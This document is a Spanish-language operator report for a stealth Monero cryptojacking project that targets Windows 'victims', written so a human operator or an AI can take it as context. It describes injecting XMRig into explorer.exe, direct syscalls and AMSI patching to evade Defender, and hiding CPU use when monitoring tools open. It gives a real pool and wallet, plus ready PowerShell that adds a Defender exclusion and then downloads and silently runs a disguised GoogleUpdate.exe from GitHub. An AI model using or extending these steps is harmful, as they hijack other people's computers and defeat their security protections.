# Reporte Técnico de Ingeniería: SilentCryptoMiner (Edición Sigilosa)

Este documento proporciona una visión técnica profunda, arquitectónica y operativa del estado actual del proyecto **Remote_Inject_SilentCryptMinerPY**. Está diseñado para servir como la única fuente de verdad para contextualizar a un operador humano o una IA sobre la implementación y capacidades del sistema.

---

## 1. Resumen Ejecutivo
El proyecto es una suite avanzada de minería de criptomonedas (XMR) diseñada para el despliegue silencioso en entornos Windows (x64). Su objetivo principal es la ejecución persistente y la evasión total de soluciones EDR/AV (especialmente Microsoft Defender) mediante técnicas de inyección de código en memoria, syscalls directos y parches de seguridad dinámicos.

---

## 2. Arquitectura de Evasión y Sigilo

### 2.1 Inyección en Memoria (Process Hollowing / RunPE)
El corazón del sistema utiliza la librería `libpeconv` para realizar un **Manual Mapping** del payload de minería (XMRig) dentro de un proceso legítimo del sistema, habitualmente `explorer.exe`.
- **Ventaja**: El payload nunca toca el disco de forma cruda; reside cifrado dentro del binario principal y se despliega directamente en el espacio de direcciones de otro proceso.
- **Detección**: Invisible para escaneos de archivos estáticos.

### 2.2 Syscalls Directos (Bypass de Hooks)
Para evitar la monitorización de APIs de Windows (como `NtCreateSection`, `NtMapViewOfSection`) por parte de los AV/EDR, el código utiliza syscalls directos.
- **Implementación**: Utiliza un motor de syscalls dinámico que resuelve los números de syscall en tiempo de ejecución para evitar firmas estáticas.
- **Impacto**: Los hooks colocados por los antivirus en `ntdll.dll` son ignorados por completo.

### 2.3 Parcheo de AMSI (Antimalware Scan Interface)
Se han implementado dos capas de protección contra el escaneo de memoria heurístico:
1. **Interna (C++)**: El binario `GoogleUpdate.exe` parchea su propia función `AmsiScanBuffer` en memoria al arrancar. Esto impide que Defender escanee el contenido de los buffers de memoria durante la inyección.
2. **Externa (PowerShell)**: Comandos de despliegue que utilizan reflexión para deshabilitar AMSI en la sesión de la shell antes de realizar tareas administrativas.

### 2.4 Sistema Watchdog y Rootkit
- **Watchdog**: Un proceso secundario que monitoriza al principal. Si el miner es detenido, el Watchdog lo relanza instantáneamente.
- **Rootkit (CPU Masking)**: Detecta la apertura de herramientas de análisis (`Taskmgr.exe`, `ProcessHacker.exe`, `perfmon.exe`, `procexp.exe`, `procexp64.exe`). En el momento en que estas herramientas se abren, el miner detiene el uso de CPU para que el usuario no note ninguna anomalía en el rendimiento.

### 2.5 Expansión Dinámica de Variables (New)
El binario incluye una rutina de variables de entorno (`ExpandEnvironmentStringsW`) implementada en C++.
- **Propósito**: Permite que el parámetro `%COMPUTERNAME%` en los argumentos de XMRig se resuelva en tiempo de ejecución en la máquina objetivo.
- **Resultado**: Cada víctima se identifica automáticamente con su nombre de host real en el dashboard del pool.

---

## 3. Detalles de Compilación y Configuración

### 3.1 Entorno de Compilación
- **Compilador**: MinGW-w64 (g++).
- **Librerías Críticas**: `libpeconv`, `ws2_32`.
- **Flags de Optimización**: `-static -static-libgcc -static-libstdc++` (Garantiza que el binario sea portable y no requiera DLLs externas como `libwinpthread-1.dll`).

### 3.2 Configuración del Miner (`miner_builder.py`)
- **Pool**: `pool.hashvault.pro:443`
- **Wallet**: `86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd`
- **Worker Name**: Configurado a través del parámetro `--pass=%COMPUTERNAME%` (Sintaxis específica para el reconocimiento de workers en Hashvault).
- **Uso de CPU**: 30% en modo activo / 80% en modo idle.
- **Tiempo de Espera Idle**: 3 minutos (Configurado en la versión final).

---

## 4. Guía de Despliegue Remoto (Indetectable)

El despliegue se ha optimizado para ser ejecutado a través de una shell remota (como WinRM, SSH o una Reverse Shell) con privilegios de Administrador.

### 4.1 Preparación del Terreno (Exclusión vía WMI)
Este comando es la clave de la evasión inicial. Utiliza WMI para añadir una exclusión en Defender sin disparar alertas de script malicioso.

```powershell
$p="C:\ProgramData\MicrosoftUpdate"; if(!(Test-Path $p)){ni $p -Type Directory -Force}; Invoke-CimMethod -Namespace root/Microsoft/Windows/Defender -ClassName MSFT_MpPreference -MethodName Add -Arguments @{ExclusionPath = [string[]]("$p")}
```

### 4.2 Transferencia y Ejecución
Descarga el binario final desde el repositorio de respaldo (GitHub) directamente a la zona excluida.

```powershell
$u="https://raw.githubusercontent.com/AlmightyDaemon/miner.exe/refs/heads/main/GoogleUpdate.exe"; (New-Object Net.WebClient).DownloadFile($u,"C:\ProgramData\MicrosoftUpdate\GoogleUpdate.exe"); Start-Process "C:\ProgramData\MicrosoftUpdate\GoogleUpdate.exe" -WindowStyle Hidden
```

---

## 5. Pruebas y Verificación (Testing)

### 5.1 Verificación de Red y Proceso
Comprobar si hay una conexión establecida con el pool de minería:
```powershell
Get-NetTCPConnection -State Established | Where-Object { $_.RemotePort -eq 443 } | Select-Object @{n="Proceso";e={(Get-Process -Id $_.OwningProcess).Name}}, RemoteAddress | Where-Object { $_.Proceso -eq "explorer" }
```

### 5.2 Monitorización de CPU Remota (Instantánea)
Para verificar el salto de **Active** a **Idle** sin usar interfaz gráfica:
```powershell
Get-Counter "\Process(explorer*)\% Processor Time" | Select-Object -ExpandProperty CounterSamples | Where-Object { $_.CookedValue -gt 0.1 } | Select-Object @{n="Proceso";e={$_.InstanceName}}, @{n="CPU_Uso(%)";e={[math]::Round($_.CookedValue / $env:NUMBER_OF_PROCESSORS, 2)}}
```

### 5.3 Verificación Final (Pool)
Entra en el dashboard de Hashvault con tu wallet. El PC aparecerá con su **Nombre Real** (ej. `DESKTOP-ABC`) en la sección de Workers.

---

## 6. Estado Actual del Repositorio
- **Ejecutable Final**: `output/GoogleUpdate.exe` (Renombrado para máxima discreción).
- **Código Fuente**: Mejorado con el parche `amsi_patch.cpp` integrado en el `main`.
- **Builder**: Configurado con enlazado estático total para evitar dependencias faltantes.

> [!IMPORTANT]
> El proyecto se encuentra en Fase de Producción. La arquitectura ha demostrado ser capaz de evadir la protección en tiempo real de Microsoft Defender (v4.18+) siempre que se siga el protocolo de exclusión por WMI antes de la descarga.
